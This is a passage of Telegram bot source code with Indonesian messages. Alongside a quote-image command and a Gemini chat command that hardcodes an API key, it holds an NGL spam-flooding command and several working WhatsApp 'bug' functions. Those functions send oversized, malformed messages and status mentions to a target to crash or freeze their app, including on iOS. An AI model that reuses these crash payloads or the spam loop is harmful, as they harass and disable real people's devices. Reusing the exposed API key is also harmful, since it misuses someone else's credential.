bot.command("ipqc", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1);
  if (args.length === 0) {
    return ctx.reply("❌ Gunakan: /ipqc <teks>");
  }

  const teks = args.join(" ");
  const processingMsg = await ctx.reply("⏳ Sedang membuat quoted iPhone bg......");

  try {
    const url = `${API_URL}?time=11%3A26&messageText=${encodeURIComponent(
      teks
    )}&carrierName=INDOSAT%20OOREDOO&batteryPercentage=88&signalStrength=4&emojiStyle=apple`;

    const response = await axios.get(url, { responseType: "arraybuffer" });

    if (response.status !== 200) {
      await ctx.reply("❌ Gagal mengambil gambar dari API");
      return;
    }

    const buffer = Buffer.from(response.data, "binary");

    await ctx.replyWithPhoto({ source: buffer }, { caption: "✅ Quoted berhasil dibuat yeyy!" });
    await ctx.deleteMessage(processingMsg.message_id); // hapus pesan proses
  } catch (error) {
    console.error(error);
    await ctx.reply(`❌ Error bg: ${error.message}`);
  }
});

const GEMINI_API_KEY = process.env.GEMINI_API_KEY || "AIzaSyAXVsajmVfnZYFpaIO1cEfvEYoEmFypomo";

const extMap = {
  javascript: "js",
  js: "js",
  python: "py",
  py: "py",
  html: "html",
  css: "css",
  json: "json",
  cpp: "cpp",
  c: "c",
  java: "java",
  php: "php",
  go: "go",
  ruby: "rb",
  txt: "txt",
};

// Fungsi ekstrak code blocks
function extractCodeBlocks(text) {
  const regex = /```(\w+)?\n([\s\S]*?)```/g;
  const blocks = [];
  let match;
  while ((match = regex.exec(text)) !== null) {
    const lang = match[1]?.toLowerCase() || "txt";
    const code = match[2].trim();
    blocks.push({ lang, code });
  }
  return blocks;
}

// Command Telegraf
bot.command("aixmd", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1);
  if (!args.length) return ctx.reply("❌ Gunakan: /aixmd <prompt>");

  const prompt = args.join(" ");
  const processingMsg = await ctx.reply("⏳ XmdAi lagi mikir jawaban...");

  try {
    const res = await axios.post(
      "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent",
      {
        contents: [{ parts: [{ text: prompt }] }],
        generationConfig: {
          temperature: 0.9,
          maxOutputTokens: 8192,
        },
      },
      {
        headers: {
          "Content-Type": "application/json",
          "X-goog-api-key": GEMINI_API_KEY,
        },
      }
    );

    const reply =
      res.data.candidates?.[0]?.content?.parts?.[0]?.text ||
      "⚠️ Tidak ada jawaban";

    const codeBlocks = extractCodeBlocks(reply);

    // Folder temp untuk simpan file sementara
    const tempDir = path.join(process.cwd(), "temp");
    if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir);

    // Kirim code blocks
    for (let i = 0; i < codeBlocks.length; i++) {
      const { lang, code } = codeBlocks[i];
      const ext = extMap[lang] || "txt";
      const filename = path.join(tempDir, `code_${Date.now()}_${i + 1}.${ext}`);
      fs.writeFileSync(filename, code);

      await ctx.replyWithDocument({ source: filename }, { 
        caption: `XmdAi: Code ${lang.toUpperCase()} blok ke-${i + 1}` 
      });

      fs.unlinkSync(filename);
    }

    // Kirim sisa teks jawaban
    const explanation = reply.replace(/```[\s\S]*?```/g, "").trim();
    if (explanation) {
      if (explanation.length > 3500) {
        const filename = path.join(tempDir, `penjelasan_${Date.now()}.txt`);
        fs.writeFileSync(filename, explanation);
        await ctx.replyWithDocument({ source: filename }, {
          caption: "XmdAi: Penjelasan terlalu panjang, dikirim via file."
        });
        fs.unlinkSync(filename);
      } else {
        await ctx.reply(explanation);
      }
    }

    // Hapus pesan proses
    await ctx.deleteMessage(processingMsg.message_id);
  } catch (err) {
    console.error(err.response?.data || err.message);
    await ctx.reply(
      `❌ Error: ${err.response?.data?.error?.message || err.message}`
    );
  }
});

bot.command("setjeda", (ctx) => {
 if (ctx.from.id != ownerID) {
   return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
 }
  const args = ctx.message.text.split(" ").slice(1).join(" ");
  const result = setCooldown(args);
  ctx.reply(result);
});

bot.command("spamngl", async (ctx) => {
  try {
    const args = ctx.message.text.split(" ").slice(1);
    if (args.length < 1) {
      return ctx.reply("🪧 ☇ Format: /spamngl @Username");
    }

    const username = args[0];
    const message = "WOI KENAL Fimm GAK TELE NYA INI @KyzzexX";
    const amount = 50;
    const delay = 5000;

    await ctx.reply(`⏳ ☇ Mengirim ${amount} pesan spam ke @${username}`);

    for (let i = 1; i <= amount; i++) {
      try {
        const array = new Uint8Array(21);
        crypto.getRandomValues(array);
        const deviceId = Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');

        const body = `username=${username}&question=${encodeURIComponent(message)}&deviceId=${deviceId}`;
        await fetch("https://ngl.link/api/submit", {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8" },
          body,
        });

      } catch (err) {
      }

      if (i < amount) {
        await new Promise((resolve) => setTimeout(resolve, delay));
      }
    }

    ctx.reply(`✅ ☇ Selesai mengirim ${amount} pesan spam ke @${username}`);
  } catch (error) {
    console.error(error);
    ctx.reply("❌ ☇ Gagal menghubungi api, Coba lagi nanti");
  }
});

//function
async function systemXf(sock, target) {
 try {
  const fimm1 = "꧀".repeat(15000);
  const undefined = "\u0000".repeat(4000);

  const payload = {
    locationMessage: {
      degreesLatitude: "99999e99999",
      degreesLongitude: "-99999e99999",
      name: "#The fimm." + undefined + fimm1,
      url: `https://wa.${fimm1}.null/`,
      contextInfo: {
        mentionedJid: [
          target,
          "0@s.whatsapp.net",
          ...Array.from({ length: 1950 }, () =>
            "1" + Math.floor(Math.random() * 9e6) + "@s.whatsapp.net"
          )
        ],
        externalAdReply: {
          advertiserName: fimm1,
          caption: undefined + fimm1,
          jpegThumbnail: Buffer.from("x"),
        },
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 9,
            expiryTimestamp: "-999999999e999999"
          },
          interactiveMessage: {
            carouselMessage: {
              messageVersion: 2,
              cards: [
                {
                  body: { 
                  text: "- The fimm." + undefined 
                  },
                  nativeFlowMessage: {
                    buttons: [
                      { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: fimm1 }) },
                      { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: undefined }) }
                    ],
                    messageParamsJson: "[".repeat(3000)
                  }
                }
              ]
            }
          }
        }
      }
    }
  };

  await sock.relayMessage(target, payload, { 
  participant: { jid: target } 
  });
  
  } catch (e) {
  console.log('Eror jir', e);
  }
}

async function callSystem(sock, target) {
  await sock.sendMessage(target, {
    interactiveMessage: {
      body: {
        text: "Xmd-----------------xmd"
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "𑜦𑜠".repeat(20000),
              url: null,
              merchant_url: null
            })
          }
        ]
      }
    }
  });
}

async function Qwonzy(sock, target, mention) {
  try {
    const msg = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              nativeFlowResponseMessage: {
                version: 3,
                name: "call_permission_request",
                paramsJson: "\u0000".repeat(1045000)
              },
              body: {
                text: "Xmd x Maklu nih",
                format: "BOLD"
              }
            }
          }
        }
      },
      {
        isForwarded: false,
        ephemeralExpiration: 0,
        background:
          "#" +
          Math.floor(Math.random() * 16777215)
            .toString(16)
            .padStart(6, "0"),
        forwardingScore: 0,
        font: Math.floor(Math.random() * 9)
      }
    );

    await sock.relayMessage("status@broadcast", msg.message, {
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ],
      statusJidList: [target],
      messageId: msg.key.id
    });

    if (mention) {
      await sock.relayMessage(
        target,
        {
          statusMentionMessage: {
            message: { protocolMessage: { key: msg.key, type: 25 } }
          }
        },
        {}
      );
    }
    console.log(
      `[Xmd delay] Bug terkirim ke ${target}`
    );
    await sleep(5000);
  } catch (err) {
    console.error(`[Xmd delay] Gagal mengirim bug ke ${target}:`, err.message);
  }
}

async function calledCrash(sock, target) {
const buttonssellect = [
{
name: "single_select",
buttonParamsJson: "",
},
];

for (let i = 0; i < 25; i++) {
buttonssellect.push(
{
name: "call_permission_request",
buttonParamsJson: JSON.stringify({
status: true,
}),
},
);
}

const msg = await generateWAMessageFromContent(
target,
{
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2,
},
interactiveMessage: {
contextInfo: {
participant: target,
mentionedJid: Array.from(
{ length: 1900 },
() => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`,
),
forwadingScore: 100,
isForwaded: true,
businessMessageForwardInfo: {
businessOwnerJid: target,
},
quotedMessage: {
paymentInviteMessage: {
serviceType: 1,
expiryTimestamp: Math.floor(Date.now() / 1000) + 60,
},
},
},
body: {
text: "#- fimm." + "ោ៝".repeat(20000),
},
nativeFlowMessage: {
messageParamsJson: JSON.stringify({
buttons: buttonssellect,
}),
},
},
},
},
},
{}
);

await sock.relayMessage(target, msg.message, {
messageId: msg.key.id,
participant: { jid: target },
});
}

async function BugDelayXmd(sock, target) {
  const Msg = await generateWaMessageFromContent(target, {
    imageMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7118-24/552151478_1776944623190269_7266107373284748666_n.enc?ccb=11-4&oh=01_Q5Aa2gGFBN2T1fs4hj9U_cN-CKChRau3EPr-Hq8nTQ7sUyOmjQ&oe=68F6362A&_nc_sid=5e03e0&mms3=true",
      mimetype: "image/jpeg",
      fileSha256: "uckq9LrvbolNHkQH75v/EXKTy3gg0GZvPDqOJKwe3pk=",
      fileLength: "40997",
      height: 1040,
      width: 780,
      mediaKey: "IXbyO16CUdW+kBT5uCGwgVudoqFU9dUC/l9HmleT7sw=",
      fileEncSha256: "+RxL5jYkhcGFd42g3iTJ+LCwiDhIY87Ak3Z8wOJaZmk=",
      directPath: "/v/t62.7118-24/552151478_1776944623190269_7266107373284748666_n.enc?ccb=11-4&oh=01_Q5Aa2gGFBN2T1fs4hj9U_cN-CKChRau3EPr-Hq8nTQ7sUyOmjQ&oe=68F6362A&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1758378527",
      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEEAMAMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAEBQACAwEGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAADtR4m9aQrbusK63btJePtBA/ySmnpkBE04urKuSUbjliEsArO2Ww+mud+D1ErmSbJklwNyQ//EACgQAAICAQEGBgMAAAAAAAAAAAECABEDMQQFEBITMhUgISJBUTNTgf/aAAgBAQABPwBvIBZJlFjQ1MO0etEQbQk6yH5hdfuLXLEUqrOBppGFHiSYrsJu7Njdem3dMS9TIqk6meFD9kXdSfLzwvB9mZ92ouInGTYiO+N7BoibMrdRWr0BmPKuQWI2VQauBoTNv2SicqQ5n7FWYcjopWItm3P8gc6AQNYhoijGDAe3WYuWKqwVCQJzrOoXF/ExWVExn2wMIz2TLi9kwfjWDgeH/8QAFxEBAQEBAAAAAAAAAAAAAAAAEAERIP/aAAgBAgEBPwDrWMf/xAAZEQACAwEAAAAAAAAAAAAAAAACEAABESD/2gAIAQMBAT8Azqxl4iZP/9k=",
      caption: "\u0000".repeat(2000000), // triger 1
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
        ],
        participant: target,
        quotedMessage: {
          locationMessage: {
            degreesLatitude: -9.4882766288,
            degreesLongitude: 9.48827662899,
            name: "\u0003".repeat(20000000), // triger 2
            address: null,
            url: null
          }
        }
      }
    }
  });

  await sock.relayMessage(target, Msg.message, {
    messageId: null, // atau ganti ke null
    participant: { jid: target }
  });
}


  
async function XmdDrainQ(sock, target, mention) {
  let parse = true;
  let SID = "5e03e0";
  let key = "10000000_2203140470115547_947412155165083119_n.enc";
  let Buffer = "01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe";
  let type = `image/webp`;
  if (11 > 9) {
    parse = parse ? false : true;
  }
  const message1 = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "#- 995 Xmds!", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\×10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "call_permission_message"
        },
        contextInfo: {
          participant: target,
          mentionedJid: Array.from(
            { length: 1900 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
          ),
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000
            },
          },
        },
      },
    },
  };
  
  let message2 = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID}&mms3=true`,
          fileSha256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
          fileEncSha256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
          mediaKey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
          mimetype: type,
          directPath: `/v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID}`,
          fileLength: {
            low: Math.floor(Math.random() * 1000),
            high: 0,
            unsigned: true,
          },
          mediaKeyTimestamp: {
            low: Math.floor(Math.random() * 1700000000),
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () =>
                "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
             ),
           ],
           forwardingScore: 100,
           isForwarded: true,
           forwardedNewsletterMessageInfo: {
              newsletterJid: "120363321780349272@newsletter",
              serverMessageId: 1,
              newsletterName: "ោ៝".repeat(10000)
            },
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: Math.floor(Math.random() * -20000000),
            high: 555,
            unsigned: parse,
          },
          isAvatar: parse,
          isAiSticker: parse,
          isLottie: parse,
        },
      },
    },
  };
  
  const msg = generateWAMessageFromContent(target, message1, message2, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  
  if (mention) {
    await sock.relayMessage(
      target, 
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      }, 
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: " null - exexute "
            },
            content: undefined
          }
        ]
      }
    );
  }
}

async function crashIosExtend(sock, target) {
  sock.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          extendedTextMessage: {
            text: "🚯⃟⃑.Ꮡ‌‌/Xmds!?" + "ۗۗۗۿۗۗۗۯۗۗۗۗۗۿۗۗۗۯۗۗۗۗۗ".repeat(1000),
            contextInfo: {
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                callLogMesssage: {
                    isVideo: true,
                    callOutcome: "1",
                    durationSecs: "0",
                    callType: "REGULAR",
                    participants: [{
                        jid: "0@s.whatsapp.net",
                        callOutcome: "1"
                    }]
                }
              }
            }
          }
        }
      }
    },
    {
      participant: { jid: target }
    }
  );
}

async function TrashIOS(sock, isTarget, Ptcp = true) {
  await sock.relayMessage(isTarget, {
      extendedTextMessage: {
        text: "#- 995 Xmds!" 
        + `${"ꦾ".repeat(103000)} ${"@13135550002".repeat(25000)}`,
        contextInfo: {
          stanzaId: "1234567890ABCDEF",
          participant: "13135550002@s.whatsapp.net",
          quotedMessage: {
            callLogMesssage: {
              isVideo: true,
              callOutcome: "1",
              durationSecs: "0",
              callType: "REGULAR",
              participants: [
                { jid: "13135550002@s.whatsapp.net", callOutcome: "1" }
              ]
            }
          },
          remoteJid: "13135550002@s.whastapp.net",
          conversionSource: "source_example",
          conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
          conversionDelaySeconds: 10,
          forwardingScore: 99999999,
          isForwarded: true,
          quotedAd: {
            advertiserName: "Example Advertiser",
            mediaType: "IMAGE",
            jpegThumbnail: Jepeg,
            caption: "This is an ad caption"
          },
          placeholderKey: {
            remoteJid: "13135550002@s.whatsapp.net",
            fromMe: false,
            id: "ABCDEF1234567890"
          },
          expiration: 86400,
          ephemeralSettingTimestamp: "1728090592378",
          ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
          externalAdReply: {
            title: "SYONC - CRITICAL FINISH",
            body: `Ai To Crash ${"\0".repeat(200)}`,
            mediaType: "VIDEO",
            renderLargerThumbnail: true,
            previewType: "VIDEO",
            thumbnail: Jepeg,
            sourceType: "x",
            sourceId: "x",
            sourceUrl: "https://www.facebook.com/WhastApp",
            mediaUrl: "https://www.facebook.com/WhastApp",
            containsAutoReply: true,
            showAdAttribution: true,
            ctwaClid: "ctwa_clid_example",
            ref: "ref_example"
          },
          entryPointConversionSource: "entry_point_source_example",
          entryPointConversionApp: "entry_point_app_example",
          entryPointConversionDelaySeconds: 5,
          disappearingMode: {},
          actionLink: { url: "https://www.facebook.com/WhatsApp" },
          groupSubject: "Example Group Subject",
          parentGroupJid: "13135550002@g.us",
          trustBannerType: "trust_banner_example",
          trustBannerAction: 1,
          isSampled: false,
          utm: {
            utmSource: "utm_source_example",
            utmCampaign: "utm_campaign_example"
          },
          forwardedNewsletterMessageInfo: {
            newsletterJid: "13135550002@newsletter",
            serverMessageId: 1,
            newsletterName: "Meta Ai",
            contentType: "UPDATE",
            accessibilityText: "Meta Ai"
          },
          businessMessageForwardInfo: {
            businessOwnerJid: "13135550002@s.whatsapp.net"
          },
          smbriyuCampaignId: "smb_riyu_campaign_id_example",
          smbServerCampaignId: "smb_server_campaign_id_example",
          dataSharingContext: { showMmDisclosure: true }
        }
      }
    },
    Ptcp ? { participant: { jid: isTarget } } : {}
  );

  console.log("Success! bug Ios Sent");
}

//akhir func 
bot.launch()
}

(async () => {
  try {
    const result = await validateToken(tokenBot);

    if (!result) {
      console.log("❌ Unexpected validation result");
      forceExit(0);
      return;
    }

    if (result.status === "ok" && result.valid) {
      console.log("✅ Token bot valid. Menjalankan bot...");
      runBot();
      return;
    }

    switch (result.status) {
      case "untrusted":
        console.log("❌ Server not connected [invalid or untrusted response]");
        break;
      case "expired":
        console.log("❌ Respons expired");
        break;
      case "error":
        console.log("❌ Gagal saat validasi:", result.message);
        break;
      default:
        console.log("❌ Validation Bot Status: Not Valid");
    }

    forceExit(1); 
    return;

  } catch (err) {
    console.log("❌ Gagal validasi token bot:", err && err.message ? err.message : String(err));
    forceExit(1);
    return;
  }
})();
